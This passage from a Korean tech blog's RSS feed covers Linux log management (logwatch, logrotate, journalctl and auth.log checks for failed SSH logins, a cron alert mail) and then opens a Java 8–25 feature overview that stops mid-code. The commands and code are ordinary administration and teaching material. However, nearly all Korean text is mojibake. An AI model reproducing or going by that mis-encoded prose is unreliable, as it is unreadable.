class="comment"># - ìë™ ë¡œê·¸ í¬ë§· ì¸ì‹</span></span><br><span class="line"><span class="comment"># - íƒ€ì„ìŠ¤íƒ¬í”„ ê¸°ì¤€ ì •ë ¬</span></span><br><span class="line"><span class="comment"># - SQL ì¿¼ë¦¬ë¥¼ í†µí•œ ë¡œê·¸ ë¶„ì„</span></span><br><span class="line"><span class="comment"># - íˆìŠ¤í† ê·¸ë¨ ë·°</span></span><br><span class="line"><span class="comment"># - ì‹¤ì‹œê°„ tail ëª¨ë“œ</span></span><br></pre></td></tr></table></figure><h3 id="logwatch-ë¡œê·¸-ë¶„ì„-ë°-ìš”ì•½"><a href="#logwatch-ë¡œê·¸-ë¶„ì„-ë°-ìš”ì•½" class="headerlink" title="logwatch - ë¡œê·¸ ë¶„ì„ ë° ìš”ì•½"></a>logwatch - ë¡œê·¸ ë¶„ì„ ë° ìš”ì•½</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì„¤ì¹˜</span></span><br><span class="line">sudo apt install logwatch</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì˜¤ëŠ˜ì˜ ë¡œê·¸ ìš”ì•½</span></span><br><span class="line">sudo logwatch --detail low --range today</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • ê¸°ê°„ ë¶„ì„</span></span><br><span class="line">sudo logwatch --range <span class="string">&quot;between -7 days and -1 days&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì´ë©”ì¼ë¡œ ì „ì†¡</span></span><br><span class="line">sudo logwatch --mailto admin@example.com</span><br></pre></td></tr></table></figure><h2 id="7-ë¡œê·¸-ë¡œí…Œì´ì…˜-logrotate"><a href="#7-ë¡œê·¸-ë¡œí…Œì´ì…˜-logrotate" class="headerlink" title="7. ë¡œê·¸ ë¡œí…Œì´ì…˜ (logrotate)"></a>7. ë¡œê·¸ ë¡œí…Œì´ì…˜ (logrotate)</h2><p>ë¡œê·¸ íŒŒì¼ì´ ë¬´í•œì • ì»¤ì§€ëŠ” ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•œ ë¡œê·¸ ë¡œí…Œì´ì…˜ ì„¤ì •ì…ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># logrotate ì„¤ì • íŒŒì¼</span></span><br><span class="line">/etc/logrotate.conf           <span class="comment"># ë©”ì¸ ì„¤ì •</span></span><br><span class="line">/etc/logrotate.d/             <span class="comment"># ì• í”Œë¦¬ì¼€ì´ì…˜ë³„ ì„¤ì •</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì„¤ì • ì˜ˆì‹œ</span></span><br><span class="line">/var/log/myapp/*.<span class="built_in">log</span> &#123;</span><br><span class="line">    daily                     <span class="comment"># ì¼ë³„ ë¡œí…Œì´ì…˜</span></span><br><span class="line">    rotate 7                  <span class="comment"># 7ê°œ ë³´ê´€</span></span><br><span class="line">    compress                  <span class="comment"># ì••ì¶•</span></span><br><span class="line">    delaycompress            <span class="comment"># ìµœì‹  íŒŒì¼ì€ ì••ì¶• ì•ˆ í•¨</span></span><br><span class="line">    missingok                <span class="comment"># íŒŒì¼ ì—†ì–´ë„ ì—ëŸ¬ ì•ˆ ëƒ„</span></span><br><span class="line">    notifempty               <span class="comment"># ë¹ˆ íŒŒì¼ì€ ë¡œí…Œì´íŠ¸ ì•ˆ í•¨</span></span><br><span class="line">    create 0644 root root    <span class="comment"># ìƒˆ íŒŒì¼ ê¶Œí•œ</span></span><br><span class="line">    sharedscripts</span><br><span class="line">    postrotate</span><br><span class="line">        systemctl reload myapp</span><br><span class="line">    endscript</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìˆ˜ë™ ì‹¤í–‰ (í…ŒìŠ¤íŠ¸)</span></span><br><span class="line">sudo logrotate -d /etc/logrotate.conf  <span class="comment"># ë“œë¼ì´ëŸ°</span></span><br><span class="line">sudo logrotate -f /etc/logrotate.conf  <span class="comment"># ê°•ì œ ì‹¤í–‰</span></span><br></pre></td></tr></table></figure><h2 id="8-ê¶Œí•œ-ê´€ë ¨"><a href="#8-ê¶Œí•œ-ê´€ë ¨" class="headerlink" title="8. ê¶Œí•œ ê´€ë ¨"></a>8. ê¶Œí•œ ê´€ë ¨</h2><p>ëŒ€ë¶€ë¶„ì˜ ì‹œìŠ¤í…œ ë¡œê·¸ëŠ” root ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo ì‚¬ìš©</span></span><br><span class="line">sudo <span class="built_in">tail</span> -f /var/log/syslog</span><br><span class="line">sudo journalctl -f</span><br><span class="line">sudo less /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¼ë°˜ ì‚¬ìš©ìê°€ ì½ì„ ìˆ˜ ìˆëŠ” ë¡œê·¸</span></span><br><span class="line">~/.bash_history               <span class="comment"># ëª…ë ¹ì–´ íˆìŠ¤í† ë¦¬</span></span><br><span class="line">~/.xsession-errors           <span class="comment"># X ì„¸ì…˜ ì—ëŸ¬</span></span><br></pre></td></tr></table></figure><h2 id="9-ë¡œê·¸-ë¶„ì„-ì‹¤ì „-ì˜ˆì œ"><a href="#9-ë¡œê·¸-ë¶„ì„-ì‹¤ì „-ì˜ˆì œ" class="headerlink" title="9. ë¡œê·¸ ë¶„ì„ ì‹¤ì „ ì˜ˆì œ"></a>9. ë¡œê·¸ ë¶„ì„ ì‹¤ì „ ì˜ˆì œ</h2><h3 id="ì‹¤íŒ¨í•œ-ë¡œê·¸ì¸-ì‹œë„-í™•ì¸"><a href="#ì‹¤íŒ¨í•œ-ë¡œê·¸ì¸-ì‹œë„-í™•ì¸" class="headerlink" title="ì‹¤íŒ¨í•œ ë¡œê·¸ì¸ ì‹œë„ í™•ì¸"></a>ì‹¤íŒ¨í•œ ë¡œê·¸ì¸ ì‹œë„ í™•ì¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># auth.logì—ì„œ ì‹¤íŒ¨í•œ SSH ë¡œê·¸ì¸ í™•ì¸</span></span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># IP ì£¼ì†Œë³„ ì‹¤íŒ¨ íšŸìˆ˜ ì§‘ê³„</span></span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/auth.log | awk <span class="string">&#x27;&#123;print $(NF-3)&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line"><span class="comment"># journalctl ì‚¬ìš©</span></span><br><span class="line">journalctl -u ssh.service | grep <span class="string">&quot;Failed password&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ë””ìŠ¤í¬-ê³µê°„-ë¶€ì¡±-ì›ì¸-ì°¾ê¸°"><a href="#ë””ìŠ¤í¬-ê³µê°„-ë¶€ì¡±-ì›ì¸-ì°¾ê¸°" class="headerlink" title="ë””ìŠ¤í¬ ê³µê°„ ë¶€ì¡± ì›ì¸ ì°¾ê¸°"></a>ë””ìŠ¤í¬ ê³µê°„ ë¶€ì¡± ì›ì¸ ì°¾ê¸°</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># í° ë¡œê·¸ íŒŒì¼ ì°¾ê¸°</span></span><br><span class="line">sudo <span class="built_in">du</span> -h /var/log/* | <span class="built_in">sort</span> -rh | <span class="built_in">head</span> -20</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • ì—ëŸ¬ ë©”ì‹œì§€ ê²€ìƒ‰</span></span><br><span class="line">grep -i <span class="string">&quot;no space left&quot;</span> /var/log/syslog</span><br></pre></td></tr></table></figure><h3 id="íŠ¹ì •-ì‹œê°„ëŒ€-ì—ëŸ¬-ì¶”ì "><a href="#íŠ¹ì •-ì‹œê°„ëŒ€-ì—ëŸ¬-ì¶”ì " class="headerlink" title="íŠ¹ì • ì‹œê°„ëŒ€ ì—ëŸ¬ ì¶”ì "></a>íŠ¹ì • ì‹œê°„ëŒ€ ì—ëŸ¬ ì¶”ì </h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì˜¤ëŠ˜ ì˜¤ì „ 10ì‹œë¶€í„° 11ì‹œê¹Œì§€ì˜ ì—ëŸ¬</span></span><br><span class="line">journalctl --since <span class="string">&quot;10:00:00&quot;</span> --<span class="keyword">until</span> <span class="string">&quot;11:00:00&quot;</span> -p err</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì–´ì œ ë°œìƒí•œ ëª¨ë“  ì—ëŸ¬</span></span><br><span class="line">journalctl --since yesterday --<span class="keyword">until</span> today -p err</span><br></pre></td></tr></table></figure><h3 id="ì„œë¹„ìŠ¤-ì¬ì‹œì‘-í™•ì¸"><a href="#ì„œë¹„ìŠ¤-ì¬ì‹œì‘-í™•ì¸" class="headerlink" title="ì„œë¹„ìŠ¤ ì¬ì‹œì‘ í™•ì¸"></a>ì„œë¹„ìŠ¤ ì¬ì‹œì‘ í™•ì¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nginx ì¬ì‹œì‘ ë¡œê·¸ í™•ì¸</span></span><br><span class="line">journalctl -u nginx.service --since <span class="string">&quot;1 hour ago&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì„œë¹„ìŠ¤ ìƒíƒœ ë³€ê²½ ì¶”ì </span></span><br><span class="line">journalctl -u nginx.service | grep -E <span class="string">&quot;Started|Stopped|Reloaded&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ë„¤íŠ¸ì›Œí¬-ê´€ë ¨-ì´ìŠˆ-ì¶”ì "><a href="#ë„¤íŠ¸ì›Œí¬-ê´€ë ¨-ì´ìŠˆ-ì¶”ì " class="headerlink" title="ë„¤íŠ¸ì›Œí¬ ê´€ë ¨ ì´ìŠˆ ì¶”ì "></a>ë„¤íŠ¸ì›Œí¬ ê´€ë ¨ ì´ìŠˆ ì¶”ì </h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ ê´€ë ¨ ë¡œê·¸</span></span><br><span class="line">dmesg | grep -i eth0</span><br><span class="line">journalctl -k | grep -i network</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—°ê²° íƒ€ì„ì•„ì›ƒ ê²€ìƒ‰</span></span><br><span class="line">grep -i <span class="string">&quot;timeout\|connection refused&quot;</span> /var/log/syslog</span><br></pre></td></tr></table></figure><h2 id="10-ë¡œê·¸-ëª¨ë‹ˆí„°ë§-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤"><a href="#10-ë¡œê·¸-ëª¨ë‹ˆí„°ë§-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤" class="headerlink" title="10. ë¡œê·¸ ëª¨ë‹ˆí„°ë§ ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤"></a>10. ë¡œê·¸ ëª¨ë‹ˆí„°ë§ ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤</h2><h3 id="ì •ê¸°ì ì¸-ë¡œê·¸-ê²€í† "><a href="#ì •ê¸°ì ì¸-ë¡œê·¸-ê²€í† " class="headerlink" title="ì •ê¸°ì ì¸ ë¡œê·¸ ê²€í† "></a>ì •ê¸°ì ì¸ ë¡œê·¸ ê²€í† </h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì¼ì¼ ì²´í¬ë¦¬ìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸ ì˜ˆì‹œ</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Failed Login Attempts ===&quot;</span></span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/auth.log | <span class="built_in">tail</span> -10</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n=== Errors in Last Hour ===&quot;</span></span><br><span class="line">journalctl --since <span class="string">&quot;1 hour ago&quot;</span> -p err</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n=== Disk Space ===&quot;</span></span><br><span class="line"><span class="built_in">df</span> -h | grep -v tmpfs</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n=== Top 10 Largest Log Files ===&quot;</span></span><br><span class="line"><span class="built_in">du</span> -h /var/log/* | <span class="built_in">sort</span> -rh | <span class="built_in">head</span> -10</span><br></pre></td></tr></table></figure><h3 id="ì¤‘ìš”-ë¡œê·¸-ì•Œë¦¼-ì„¤ì •"><a href="#ì¤‘ìš”-ë¡œê·¸-ì•Œë¦¼-ì„¤ì •" class="headerlink" title="ì¤‘ìš” ë¡œê·¸ ì•Œë¦¼ ì„¤ì •"></a>ì¤‘ìš” ë¡œê·¸ ì•Œë¦¼ ì„¤ì •</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># crontabì— ì¶”ê°€í•˜ì—¬ ì •ê¸°ì ìœ¼ë¡œ ì²´í¬</span></span><br><span class="line">*/30 * * * * grep -i <span class="string">&quot;critical\|emergency&quot;</span> /var/log/syslog | mail -s <span class="string">&quot;Critical System Alert&quot;</span> admin@example.com</span><br></pre></td></tr></table></figure><h3 id="ë¡œê·¸-ì¤‘ì•™-ì§‘ì¤‘í™”"><a href="#ë¡œê·¸-ì¤‘ì•™-ì§‘ì¤‘í™”" class="headerlink" title="ë¡œê·¸ ì¤‘ì•™ ì§‘ì¤‘í™”"></a>ë¡œê·¸ ì¤‘ì•™ ì§‘ì¤‘í™”</h3><ul><li>rsyslogë¥¼ ì‚¬ìš©í•œ ì›ê²© ë¡œê·¸ ì „ì†¡</li><li>ELK Stack (Elasticsearch, Logstash, Kibana)</li><li>Graylog</li><li>Splunk</li></ul><h2 id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://man7.org/linux/man-pages/man1/journalctl.1.html">journalctl man page</a></li><li><a href="https://www.rsyslog.com/doc/">rsyslog documentation</a></li><li><a href="https://linux.die.net/man/8/logrotate">logrotate configuration</a></li><li><a href="https://www.loggly.com/ultimate-guide/linux-logging-basics/">The Ultimate Guide to Logging</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Linux/">Linux</category>
      
      
      <category domain="https://ckck803.github.io/tags/Linux/">Linux</category>
      
      <category domain="https://ckck803.github.io/tags/Log/">Log</category>
      
      <category domain="https://ckck803.github.io/tags/journalctl/">journalctl</category>
      
      <category domain="https://ckck803.github.io/tags/syslog/">syslog</category>
      
      
      <comments>https://ckck803.github.io/2025/11/29/linux/linux-log-management/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JAVA - ìë°” ë²„ì „ë³„ ì£¼ìš” íŠ¹ì§• ì´ì •ë¦¬ (Java 8 ~ Java 25)</title>
      <link>https://ckck803.github.io/2025/11/27/java/java-version-history/</link>
      <guid>https://ckck803.github.io/2025/11/27/java/java-version-history/</guid>
      <pubDate>Thu, 27 Nov 2025 14:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/java/java.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ë“¤ì–´ê°€ë©°&quot;&gt;&lt;a href=&quot;#ë“¤ì–´ê°€ë©°&quot; class=&quot;headerlink&quot; title=&quot;ë“¤ì–´ê°€ë©°&quot;&gt;&lt;/a&gt;ë“¤ì–´ê°€ë©°&lt;/h2&gt;&lt;p&gt;ìë°”ëŠ” 1996ë…„ ì²˜ìŒ ë“±ì¥í•œ ì´í›„ ì§€ì†ì ìœ¼ë¡œ ë°œì „í•´ì™”ìŠµë‹ˆë‹¤. íŠ¹íˆ Java 8 ì´í›„ë¡œëŠ” 6ê°œì›”ë§ˆë‹¤ ìƒˆë¡œìš´ ë²„ì „ì´ ì¶œì‹œë˜ë©´ì„œ ë¹ ë¥´ê²Œ ì§„í™”í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ ê¸€ì—ì„œëŠ” Java 8ë¶€í„° ìµœì‹  ë²„ì „ì¸ Java 25ê¹Œì§€ì˜ ì£¼ìš” íŠ¹ì§•ë“¤ì„ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ê° ë²„ì „ì˜ í•µì‹¬ ê¸°ëŠ¥ë“¤ì„ ì´í•´í•˜ë©´ í˜„ëŒ€ì ì¸ ìë°” ê°œë°œì„ ë” íš¨ê³¼ì ìœ¼ë¡œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Java-8-2014ë…„-3ì›”-LTS&quot;&gt;&lt;a href=&quot;#Java-8-2014ë…„-3ì›”-LTS&quot; class=&quot;headerlink&quot; title=&quot;Java 8 (2014ë…„ 3ì›”) - LTS&quot;&gt;&lt;/a&gt;Java 8 (2014ë…„ 3ì›”) - LTS&lt;/h2&gt;&lt;p&gt;Java 8ì€ ìë°” ì—­ì‚¬ìƒ ê°€ì¥ í˜ëª…ì ì¸ ë³€í™”ë¥¼ ê°€ì ¸ì˜¨ ë²„ì „ì…ë‹ˆë‹¤. í•¨ìˆ˜í˜• í”„ë¡œê·¸ë˜ë° íŒ¨ëŸ¬ë‹¤ì„ì„ ë³¸ê²©ì ìœ¼ë¡œ ë„ì…í•˜ë©´ì„œ ìë°”ì˜ ì½”ë”© ìŠ¤íƒ€ì¼ì„ ì™„ì „íˆ ë°”ê¾¸ì–´ ë†“ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;ëŒë‹¤-í‘œí˜„ì‹-Lambda-Expressions&quot;&gt;&lt;a href=&quot;#ëŒë‹¤-í‘œí˜„ì‹-Lambda-Expressions&quot; class=&quot;headerlink&quot; title=&quot;ëŒë‹¤ í‘œí˜„ì‹ (Lambda Expressions)&quot;&gt;&lt;/a&gt;ëŒë‹¤ í‘œí˜„ì‹ (Lambda Expressions)&lt;/h3&gt;&lt;p&gt;ëŒë‹¤ í‘œí˜„ì‹ì€ ìµëª… í•¨ìˆ˜ë¥¼ ê°„ê²°í•˜ê²Œ í‘œí˜„í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. ê¸°ì¡´ì—ëŠ” ìµëª… ë‚´ë¶€ í´ë˜ìŠ¤ë¥¼ ì‚¬ìš©í•´ì•¼ í–ˆë˜ ì½”ë“œë¥¼ í›¨ì”¬ ê°„ê²°í•˜ê²Œ ì‘ì„±í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Java 7 ì´ì „&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;button.addActionListener(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;ActionListener&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;actionPerformed&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ActionEvent e)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        System.out.println(&lt;span class=&quot;string&quot;&gt;&amp;quot;Button clicked!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Java 8 ì´í›„&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;button.addActionListener(e -&amp;gt; System.out.println(&lt;span class=&quot;string&quot;&gt;&amp;quot;Button clicked!&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ìŠ¤íŠ¸ë¦¼-API-Stream-API&quot;&gt;&lt;a href=&quot;#ìŠ¤íŠ¸ë¦¼-API-Stream-API&quot; class=&quot;headerlink&quot; title=&quot;ìŠ¤íŠ¸ë¦¼ API (Stream API)&quot;&gt;&lt;/a&gt;ìŠ¤íŠ¸ë¦¼ API (Stream API)&lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/java/java.png"></p><h2 id="ë“¤ì–´ê°€ë©°"><a href="#ë“¤ì–´ê°€ë©°" class="headerlink" title="ë“¤ì–´ê°€ë©°"></a>ë“¤ì–´ê°€ë©°</h2><p>ìë°”ëŠ” 1996ë…„ ì²˜ìŒ ë“±ì¥í•œ ì´í›„ ì§€ì†ì ìœ¼ë¡œ ë°œì „í•´ì™”ìŠµë‹ˆë‹¤. íŠ¹íˆ Java 8 ì´í›„ë¡œëŠ” 6ê°œì›”ë§ˆë‹¤ ìƒˆë¡œìš´ ë²„ì „ì´ ì¶œì‹œë˜ë©´ì„œ ë¹ ë¥´ê²Œ ì§„í™”í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ ê¸€ì—ì„œëŠ” Java 8ë¶€í„° ìµœì‹  ë²„ì „ì¸ Java 25ê¹Œì§€ì˜ ì£¼ìš” íŠ¹ì§•ë“¤ì„ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ê° ë²„ì „ì˜ í•µì‹¬ ê¸°ëŠ¥ë“¤ì„ ì´í•´í•˜ë©´ í˜„ëŒ€ì ì¸ ìë°” ê°œë°œì„ ë” íš¨ê³¼ì ìœ¼ë¡œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><hr><h2 id="Java-8-2014ë…„-3ì›”-LTS"><a href="#Java-8-2014ë…„-3ì›”-LTS" class="headerlink" title="Java 8 (2014ë…„ 3ì›”) - LTS"></a>Java 8 (2014ë…„ 3ì›”) - LTS</h2><p>Java 8ì€ ìë°” ì—­ì‚¬ìƒ ê°€ì¥ í˜ëª…ì ì¸ ë³€í™”ë¥¼ ê°€ì ¸ì˜¨ ë²„ì „ì…ë‹ˆë‹¤. í•¨ìˆ˜í˜• í”„ë¡œê·¸ë˜ë° íŒ¨ëŸ¬ë‹¤ì„ì„ ë³¸ê²©ì ìœ¼ë¡œ ë„ì…í•˜ë©´ì„œ ìë°”ì˜ ì½”ë”© ìŠ¤íƒ€ì¼ì„ ì™„ì „íˆ ë°”ê¾¸ì–´ ë†“ì•˜ìŠµë‹ˆë‹¤.</p><h3 id="ëŒë‹¤-í‘œí˜„ì‹-Lambda-Expressions"><a href="#ëŒë‹¤-í‘œí˜„ì‹-Lambda-Expressions" class="headerlink" title="ëŒë‹¤ í‘œí˜„ì‹ (Lambda Expressions)"></a>ëŒë‹¤ í‘œí˜„ì‹ (Lambda Expressions)</h3><p>ëŒë‹¤ í‘œí˜„ì‹ì€ ìµëª… í•¨ìˆ˜ë¥¼ ê°„ê²°í•˜ê²Œ í‘œí˜„í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. ê¸°ì¡´ì—ëŠ” ìµëª… ë‚´ë¶€ í´ë˜ìŠ¤ë¥¼ ì‚¬ìš©í•´ì•¼ í–ˆë˜ ì½”ë“œë¥¼ í›¨ì”¬ ê°„ê²°í•˜ê²Œ ì‘ì„±í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java 7 ì´ì „</span></span><br><span class="line">button.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Button clicked!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Java 8 ì´í›„</span></span><br><span class="line">button.addActionListener(e -&gt; System.out.println(<span class="string">&quot;Button clicked!&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="ìŠ¤íŠ¸ë¦¼-API-Stream-API"><a href="#ìŠ¤íŠ¸ë¦¼-API-Stream-API" class="headerlink" title="ìŠ¤íŠ¸ë¦¼ API (Stream API)"></a>ìŠ¤íŠ¸ë¦¼ API (Stream API)</h3><p>ì»¬ë ‰ì…˜ ë°ì´í„°ë¥¼ í•¨ìˆ˜í˜• ìŠ¤íƒ€ì¼ë¡œ ì²˜ë¦¬í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” ê°•ë ¥í•œ APIì…ë‹ˆë‹¤. ë°ì´í„°ë¥¼ í•„í„°ë§í•˜ê³ , ë³€í™˜í•˜ê³ , ì§‘ê³„í•˜ëŠ” ì‘ì—…ì„ ì„ ì–¸ì ìœ¼ë¡œ í‘œí˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>, <span class="string">&quot;David&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì´ë¦„ì´ 5ê¸€ì ì´ìƒì¸ ê²ƒë§Œ í•„í„°ë§í•˜ê³  ëŒ€ë¬¸ìë¡œ ë³€í™˜</span></span><br><span class="line">List&lt;String&gt; result = names.stream()</span><br><span class="line">    .filter(name -&gt; name.length() &gt;= <span class="number">5</span>)</span><br><span class="line">    .map(String::toUpperCase)</span><br><span class="line">    .collect(Collectors.toList());</span><br><span class="line"><span class="comment">// ê²°ê³¼: [&quot;ALICE&quot;, &quot;CHARLIE&quot;, &quot;DAVID&quot;]</span></span><br></pre></td></tr></table></figure><h3 id="Optional-í´ë˜ìŠ¤"><a href="#Optional-í´ë˜ìŠ¤" class="headerlink" title="Optional í´ë˜ìŠ¤"></a>Optional í´ë˜ìŠ¤</h3><p>Null ì°¸ì¡°ë¡œ ì¸í•œ NullPointerExceptionì„ ë°©ì§€í•˜ê¸° ìœ„í•œ ì»¨í…Œì´ë„ˆ í´ë˜ìŠ¤ì…ë‹ˆë‹¤. ê°’ì´ ìˆì„ ìˆ˜ë„, ì—†ì„ ìˆ˜ë„ ìˆëŠ” ìƒí™©ì„ ëª…ì‹œì ìœ¼ë¡œ í‘œí˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Optional&lt;String&gt; optional = Optional.ofNullable(getName());</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> optional.orElse(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line"></span><br><span class="line">optional.ifPresent(n -&gt; System.out.println(<span class="string">&quot;Name: &quot;</span> + n));</span><br></pre></td></tr></table></figure><h3 id="ìƒˆë¡œìš´-ë‚ ì§œ-ì‹œê°„-API-java-time"><a href="#ìƒˆë¡œìš´-ë‚ ì§œ-ì‹œê°„-API-java-time" class="headerlink" title="ìƒˆë¡œìš´ ë‚ ì§œ&#x2F;ì‹œê°„ API (java.time)"></a>ìƒˆë¡œìš´ ë‚ ì§œ&#x2F;ì‹œê°„ API (java.time)</h3><p>ê¸°ì¡´ì˜ Date, Calendar í´ë˜ìŠ¤ì˜ ë¬¸ì œì ì„ í•´ê²°í•œ ìƒˆë¡œìš´ ë‚ ì§œ&#x2F;ì‹œê°„ APIê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ë¶ˆë³€ ê°ì²´ë¡œ ì„¤ê³„ë˜ì–´ ìŠ¤ë ˆë“œ ì•ˆì „í•˜ë©°, ë” ì§ê´€ì ì¸ APIë¥¼ ì œê³µí•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">LocalDate</span> <span class="variable">today</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">birthday</span> <span class="operator">=</span> LocalDate.of(<span class="number">1990</span>, Month.JANUARY, <span class="number">1</span>);</span><br><span class="line"><span class="type">Period</span> <span class="variable">age</span> <span class="operator">=</span> Period.between(birthday, today);</span><br><span class="line"></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">meeting</span> <span class="operator">=</span> LocalDateTime.of(<span class="number">2024</span>, <span 